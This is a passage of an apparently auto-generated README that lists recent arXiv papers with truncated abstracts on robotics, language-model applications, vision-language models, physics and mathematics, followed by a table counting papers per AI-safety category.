  ExpertCrowd-SWE (EC-SWE) is a benchmark of 100 expert-authored, multi-file software engineering tasks for evaluating autonomous coding agents in large, unfamiliar codebases. Each task is a change request written by a practising engineer against a pinned commit of a real repository, paired with a sealed reference solution and a task-specific grader whose weighted, mostly executable criteria award partial credit; must-pass blockers and pass/fail gates encode what a maintainer would refuse to merge...
  </details>

- **2026-11-09** — Delin Zhao, Zhengrong Yue, Junlin He et al. — [RoboACE: Adversarial Co-Evolution for Robot Self-Improvement](http://arxiv.org/abs/2611.13034v1)
  <details><summary>📄 Abstract</summary>
  Robot agents can improve reusable skills, planning procedures, and recovery strategies from execution feedback, yet a fixed practice source leaves the search for new weaknesses unchanged. Useful practice depends on the agent's current capabilities, so the procedure that chooses practice must also be revisable. We present RoboACE (Robot Adversarial Co-Evolution), a framework that jointly evolves curriculum and execution harnesses around frozen foundation models. The curriculum harness uses accumu...
  </details>

- **2026-11-09** — Bogdan Mamaev, Qizhou Wang, Christopher Leckie et al. — [Measuring Definition Sensitivity in LLM Annotation of Social Science Concepts](http://arxiv.org/abs/2611.13339v1)
  <details><summary>📄 Abstract</summary>
  In social science research, text annotation is a fundamental task that is traditionally a costly, hard-to-scale manual process. Researchers have used large language models (LLMs) to perform annotation by writing a definition of a concept into a prompt - a rule that determines whether a label should be attributed to a text depending on its content. However, concepts such as hate speech, fake news, and terrorism typically have several theoretically defensible competing definitions. It is also unkn...
  </details>

- **2026-11-09** — Zhaoyi Liu, Haichuan Zhang, Xiaochuan Gong et al. — [Disentangling Multimodal Rotary Positional Embedding in Vision-Language Models](http://arxiv.org/abs/2611.13334v1)
  <details><summary>📄 Abstract</summary>
  Vision-language models widely adopt Multimodal Rotary Position Embedding (MRoPE), an extension of Rotary Position Embedding (RoPE) that incorporates temporal, height, and width axes to encode the spatial structure of visual tokens. However, MRoPE also assigns height and width coordinates to text tokens that lack inherent spatial structure, introducing spatial positional effects into text-vision attention. Existing MRoPE variants explore different frequency allocations and coordinate layouts, wit...
  </details>

- **2026-11-09** — Xiang Fang, Wanlong Fang, Junhao Dong et al. — [ABRR: Transforming Temporal Sentence Grounding with Wasserstein-Adaptive Refinement and Precision Ranking](http://arxiv.org/abs/2611.13310v1)
  <details><summary>📄 Abstract</summary>
  Temporal Sentence Grounding (TSG) aims to localize temporal segments in untrimmed videos that correspond to natural language queries, a critical task for video understanding with applications in video retrieval, summarization, and human-computer interaction. Despite significant progress driven by transformer-based models, existing TSG methods suffer from two key limitations: quantization errors due to temporal downsampling, which misalign segment boundaries, and suboptimal ranking of predictions...
  </details>

- **2026-11-09** — Michelle Ho, Maximilian Adang, Zachary Booth et al. — [Large Language Model Explainability for Planning Lunar Rover Trajectories under Uncertainty](http://arxiv.org/abs/2611.13292v1)
  <details><summary>📄 Abstract</summary>
  Planning planetary rover trajectories under probabilistic uncertainty is a multi-objective optimization problem that science teams currently iteratively solve and verify by hand. This process becomes impractical when timelines and constraints frequently shift throughout the mission planning phase. Sampling-based planners such as Monte Carlo tree search can speed up this process, but their outputs do not preserve traceability to the science objectives that justify each plan, which the science tea...
  </details>

- **2026-11-09** — Yunpeng Xiao, Yuzhang Xie, Junhao Huang et al. — [Decisions by Discrimination: Differential Evidence for Medical Reasoning](http://arxiv.org/abs/2611.13233v1)
  <details><summary>📄 Abstract</summary>
  Large language models (LLMs) are increasingly studied for clinical decision support, and medical question answering provides a testbed for evaluating this capability. In particular, medical multiple-choice questions (MCQs) reflect a core challenge in clinical decision-making: plausible options often share overlapping evidence, while only a few decisive factors distinguish the correct option from incorrect ones. However, existing retrieval-based and reasoning-oriented methods mainly focus on supp...
  </details>

- **2026-11-09** — Daofu Zhang, Qingcheng Zeng, Chunwei Liu et al. — [ARoute: Task-Aligned Batch and Streaming Model Routing](http://arxiv.org/abs/2611.13209v1)
  <details><summary>📄 Abstract</summary>
  Language models increasingly power data-intensive applications, from semantic data processing to question answering and agentic workflows. Using frontier models for every request is prohibitively expensive, while relying only on smaller models reduces accuracy. We study model routing under a user-specified cost budget, aiming to maximize accuracy under task-specific correctness criteria. Existing routers fall short in two ways: pretrained routers rely on generic preference signals that may not r...
  </details>

- **2026-11-09** — Lingzhi Shen, Xiaohao Cai, Yunfei Long et al. — [HiCAP: Hierarchical Cultural Adaptation via Personality for Dialogue Generation](http://arxiv.org/abs/2611.13207v1)
  <details><summary>📄 Abstract</summary>
  Cultural adaptation in dialogue systems refers to the ability to generate responses that conform to linguistic norms and social expectations across different cultures. However, existing dialogue generation approaches pay limited attention to the role of personality in shaping cultural expression and communication style. We therefore propose HiCAP, a novel framework that integrates personality traits into culturally adaptive dialogue generation. HiCAP employs a personality-conditioned control mec...
  </details>

- **2026-11-09** — Sepideh Ravanbakhsh, Hamidreza Moradi — [Cognitive Multi-Agent Search and Rescue: Language-Grounded Hierarchical Reinforcement Learning for Collaborative Robotics](http://arxiv.org/abs/2611.13161v1)
  <details><summary>📄 Abstract</summary>
  Effective search and rescue (SAR) operations require autonomous systems capable of coordinating multiple heterogeneous agents, adapting to dynamic hazards, and aligning with human mission intent. Existing language-guided reinforcement learning (RL) methods primarily focus on single-agent instruction following and lack mechanisms for team-level coordination in complex, partially observable environments. This paper presents a Cognitive Multi-Agent Framework based on Language-Grounded Hierarchical ...
  </details>

- **2026-11-09** — Lluís Arola-Fernández, Aissam Khadraoui, Alex Arenas — [Everything in its right place: attention is a radio head](http://arxiv.org/abs/2611.13146v1)
  <details><summary>📄 Abstract</summary>
  Attention, the core of language models, is a digital calculation over tokens: an exponential selects them, a division normalizes and a positional code sets the order. We show that attention can instead emerge from the synchronization of a receiver with its context tokens. Each past token is an oscillator whose state carries its content and whose frequency drifts with its age. The present token selects them by content, aligning an antenna with its query, and by position, setting the frequency of ...
  </details>

- **2026-11-09** — Johin Johny Arimbur, Ankur Ashit Ghosh, Shervin Sam — [The Indic Token Tax in 2026: Measuring Tokenizer. Disparity and Its Cost for the Languages of India](http://arxiv.org/abs/2611.13058v1)
  <details><summary>📄 Abstract</summary>
  Commercial language model APIs bill per token, so a tokenizer that needs more tokens for the same content in one language makes that language more expensive, slower, and able to fit less text in a fixed context window. We measure this disparity for nine public tokenizers, including those of GPT-4, GPT-4o, Qwen2.5, DeepSeek-V3, Mistral-Nemo and four Sarvam models, on all 25 languages of India available in FLORES-200 (2,009 professionally translated sentences aligned with English) and on 13,732 hu...
  </details>

- **2026-11-09** — Pengkun Wang, Rui Mao, Zhe Zhao et al. — [ChipOmni: A General-Purpose AI Agent for Electronic Design Automation](http://arxiv.org/abs/2611.13020v1)
  <details><summary>📄 Abstract</summary>
  Electronic design automation (EDA) workflows remain highly fragmented, requiring engineers to coordinate heterogeneous representations, specialised software tools, and iterative verification across multiple design stages. Although large language models have brought more general reasoning and code-generation capabilities to EDA, many existing approaches remain focused on isolated tasks and struggle to plan, verify, and repair designs autonomously within executable engineering environments. Here w...
  </details>

- **2026-11-09** — Duy Anh Nguyen, Trung Dung Ngo — [Force-Closure Condition for Cooperative Multi-robot Pushing of Rectangular Objects](http://arxiv.org/abs/2611.13268v1)
  <details><summary>📄 Abstract</summary>
  In cooperative object manipulation, the placement of pushing contacts determines whether force closure can be achieved and agents can generate arbitrary forces and torques on the object correspondingly. This study derives a necessary and sufficient closed-form condition for the planar force closure of a rectangular object, a common object shape in everyday settings, under four frictionless pushing contacts. For a rectangle of length $b$ and width $a$, force closure holds if and only if $(l_1+l_3...
  </details>

- **2026-11-09** — Shiki Iwase — [Fastener-centric acquisition and AND/OR graph representation of state-dependent disassembly knowledge from CAD-derived virtual assemblies](http://arxiv.org/abs/2611.13379v1)
  <details><summary>📄 Abstract</summary>
  Design-stage disassemblability assessment requires knowledge of product structure and the operations available in each assembly state, but CAD assemblies do not directly specify state-dependent disassembly operations. This paper proposes a fastener-centric virtual-disassembly framework that acquires such knowledge from CAD-derived virtual assemblies. Fasteners jointly releasing the same constraint are grouped into operation-level sets, avoiding enumeration of arbitrary individual-fastener orders...
  </details>

- **2026-11-09** — Andrea Martínez Pacheco, Sara Rodríguez Corvillo, Alberto Rivera-Calzada et al. — [Hysteresis and mode switching in FIB engineered random laser diodes](http://arxiv.org/abs/2611.13328v1)
  <details><summary>📄 Abstract</summary>
  Complex dynamical behavior in laser diodes is commonly induced by external perturbations such as optical or optoelectronic feedback and optical injection. The structural transformation of a stable laser diode into a stand-alone nonlinear dynamical system would provide a practical alternative as a single and compact device. Here we demonstrate the fabrication of such a device by milling, via focused ion beam, the output facet of a Fabry-Perot laser diode with a predesigned mask, obtaining a scatt...
  </details>

- **2026-11-09** — Komal Thareja, Mats Rynge, Berent Aldikacti et al. — [PegasusAI Studio: Legible Cyberinfrastructure and Accountable AI Agents for Scientific Workflows](http://arxiv.org/abs/2611.13309v1)
  <details><summary>📄 Abstract</summary>
  AI coding agents can now construct scientific workflows, but operating them on shared cyberinfrastructure (CI) raises problems that code generation does not solve. Agents need current knowledge of the workflow system and its execution sites and access to the runtime state of distributed executions, while facilities need to attribute every agent action to a user and bound it by that user's privileges. We present PegasusAI Studio, an AI-assisted science gateway built on the Pegasus and HTCondor st...
  </details>

- **2026-11-09** — Jiamin He, Mark Rowland, Zhaohan Daniel Guo et al. — [Off-policy Learning with Excursion Policies](http://arxiv.org/abs/2611.13275v1)
  <details><summary>📄 Abstract</summary>
  Off-policy reinforcement learning (RL) tries to learn the value of a target policy while data comes from a different behavior policy. This often requires trading off bias for variance or stability. One way to trade these off is to linearly interpolate between the behavior and target policies, but this represents only one point in a broader space of interpolation mechanisms. We introduce excursion policies--a structured alternative where the agent follows the target policy for a multi-step "excur...
  </details>

- **2026-11-09** — Melody Zixuan Li, Taylor Webb — [What drives the emergence of symbolic mechanisms in large language models?](http://arxiv.org/abs/2611.13270v1)
  <details><summary>📄 Abstract</summary>
  Recent work has identified a set of emergent symbolic mechanisms that support abstract reasoning in large language models, but it remains unclear what factors drive the emergence of these mechanisms. To address this question, we trained neural networks from scratch on abstract sequence tasks, varying both architectural and data distributional factors, and investigated the effects of these factors on the emergence of symbolic mechanisms. Using representational, attentional, and causal mediation a...
  </details>

- **2026-11-09** — Madhu Sudhan Rao Beesetty — [Agreeing on the Answer but Not the Reason: Measurement Limits of LLM Reasoning Failure Taxonomies](http://arxiv.org/abs/2611.13140v1)
  <details><summary>📄 Abstract</summary>
  Failure taxonomies for LLM reasoning are increasingly reported as measurements: papers state what fraction of a model's errors fall into named categories, then compare those fractions across models. We show that for one such category the reported fraction is largely a property of the measurement procedure. We defined Compositional Collapse (a model notices a required sub-part of a problem, then drops or misapplies it) and measured it across twelve models and eleven languages on a public multilin...
  </details>

- **2026-11-09** — Ronnie Andrews, Alain Connes, Antonio La Gatta — [The uncertainty operator, the Weil ground state and the zeros of zeta: a numerical study and conditional positivity of the Weil quadratic form](http://arxiv.org/abs/2611.13129v1)
  <details><summary>📄 Abstract</summary>
  Applying the Dirichlet principle to the Weil quadratic form $QW_λ$ on $L^2([λ^{-1},λ],d^*u)$--using only the primes $p\leλ^2$ of the Euler product--yields canonical finite-dimensional Hermitian matrices whose ground state has a Mellin transform with zeros proved real in full generality when the lowest eigenvalue is simple and even. While $λ^2=13$ gave $50$ zeros of $ζ$, $λ^2=250$ ($λ\sim16$) gives the first $1000$ zeros with $>500$ correct decimals (the first with $1341$). We explain this via a ...
  </details>

- **2026-11-09** — Erik Derner, Jiří Kubalík, Robert Babuška — [ASPIRE: An Agentic System-Identification Platform for Iterative Reasoning and Exploration](http://arxiv.org/abs/2611.13114v1)
  <details><summary>📄 Abstract</summary>
  System identification requires expert decisions on the identification method, incorporation of prior physical knowledge, and model validation. We propose ASPIRE, a framework for nonlinear system identification in which a large language model agent selects and executes the identification method. ASPIRE constructs closed-form, nonlinear static or dynamic models from measured data, optionally supplemented by a system description, the intended use of the model, and physical requirements expressed fo...
  </details>

- **2026-11-09** — György Eigner, Patrik P. Süli, Roland Hollós — [Trust, but verify, audit and attribute: a human-in-the-loop framework for checking AI-produced research results](http://arxiv.org/abs/2611.13042v1)
  <details><summary>📄 Abstract</summary>
  Artificial intelligence (AI) systems now produce research results in bulk: in October 2026 a single laboratory released more than 700 AI-generated mathematics manuscripts, only part of them with machine-checked proofs. Such volumes will be checked mostly by AI agents that call specialised software. A passing check certifies only the artefact that was checked. For proofs translated into the proof assistant Lean, it has been shown that this artefact may state something other than the author's text...
  </details>

- **2026-11-09** — Jiajun Chen, Shicheng Fang, Jiahao Lu et al. — [GTAGym: Real AAA Game Tasks Environment for Evaluation and Reinforcement Learning](http://arxiv.org/abs/2611.13028v1)
  <details><summary>📄 Abstract</summary>
  AAA games offer a rich testbed for evaluating agent perception, reasoning, and control. However, evaluating whether agents can complete tasks in AAA games is challenging and often human-annotated because task outcomes are often difficult to verify automatically, let alone applying it for Reinforcement Learning (RL). We introduce GTAGym, an environment and framework for evaluation and RL on GTA V tasks. Its evaluation benchmark, GTAVBench, derived from GTA V main-story missions, contains 103 onli...
  </details>

- **2026-11-09** — Zhenyuan Chen, Wenshuo Tao, Zhuo Huang et al. — [When to Trust Adaptation: Contextual Fusion for Transferable Vision-Language Prompting](http://arxiv.org/abs/2611.11824v2)
  <details><summary>📄 Abstract</summary>
  When a vision-language model encounters a new class or domain, how much should it trust its learned prompts? Because source adaptation can correct pretrained errors on some target images while disturbing valid predictions on others, we introduce Contextual Adaptive Fusion (CAF), which retains four prediction branches by pairing frozen and prompted visual and textual representations. To arbitrate when branches disagree on an image, CAF combines each branch's predictive confidence with how frequen...
  </details>


## 📊 统计 / Statistics

| 分类 / Category | 论文数 / Count |
|------|--------|
| jailbreak | 719 |
| prompt-injection | 682 |
| memory-poisoning | 59 |
| tool-use-attack | 175 |
| backdoor | 558 |
| adversarial-attack | 668 |
| privacy-leakage | 4588 |
| steganography | 93 |
| misuse | 1314 |
| red-teaming | 153 |
| vulnerability | 3997 |
| defense | 3898 |
| alignment | 3657 |
| robustness | 4009 |
| watermark | 754 |
| unlearning | 120 |
| agent-safety | 67 |
| benchmark | 75 |
| survey | 453 |
| other | 11002 |

---

📚 **全部 37041 篇论文**（2022 至今）请访问 [GitHub Pages](https://ny1024.github.io/AgentSafety-Papers/) 查看完整列表、搜索与筛选。

*Generated by AgentGuard at 2026-11-14 05:18:47*